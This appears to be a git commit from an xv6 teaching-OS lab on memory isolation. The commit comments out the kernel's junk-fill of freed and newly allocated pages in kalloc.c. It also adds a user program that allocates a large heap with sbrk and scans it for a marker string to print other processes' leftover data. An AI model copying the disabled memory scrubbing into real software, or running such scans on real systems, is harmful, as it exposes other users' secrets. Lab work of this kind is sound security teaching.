7bd4ce2d5001eb63f422fdb0a518adb0a56ea39b
ZlatevskiAndrei <andrejzlate@gmail.com>
2026-08-17 19:21:40 +0200

    exposing content of unallocated processes by spamming sbrk

--- kernel/kalloc.c
+++ kernel/kalloc.c
@@ -52,7 +52,7 @@ kfree(void *pa)
     panic("kfree");
 
   // Fill with junk to catch dangling refs.
-  memset(pa, 1, PGSIZE);
+  //memset(pa, 1, PGSIZE);
 
   r = (struct run*)pa;
 
@@ -76,7 +76,7 @@ kalloc(void)
     kmem.freelist = r->next;
   release(&kmem.lock);
 
-  if(r)
-    memset((char*)r, 5, PGSIZE); // fill with junk
+  //if(r)
+    //memset((char*)r, 5, PGSIZE); // fill with junk
   return (void*)r;
 }
--- user/attack.c
+++ user/attack.c
@@ -3,10 +3,31 @@
 #include "user/user.h"
 #include "kernel/riscv.h"
 
+#define HGESIZE (126 * 1024 * 1024)
+
+void
+printataddr(void *addr)
+{
+    printf("%s\n", (char *)addr);
+}
+
 int
 main(int argc, char *argv[])
 {
-  // Your code here.
+    char *start = sbrk(HGESIZE);
 
-  exit(1);
+    if (start == (char *)-1) {
+        printf("sbrk failed\n");
+        exit(1);
+    }
+
+    for (char *p = start; p < start + HGESIZE - 3; p++) {
+        if (p[0] == 'h' &&
+            p[1] == 'e' &&
+            p[2] == 'h' &&
+            p[3] == 'e') {
+            printataddr(p);
+        }
+    }
+    exit(0);
 }
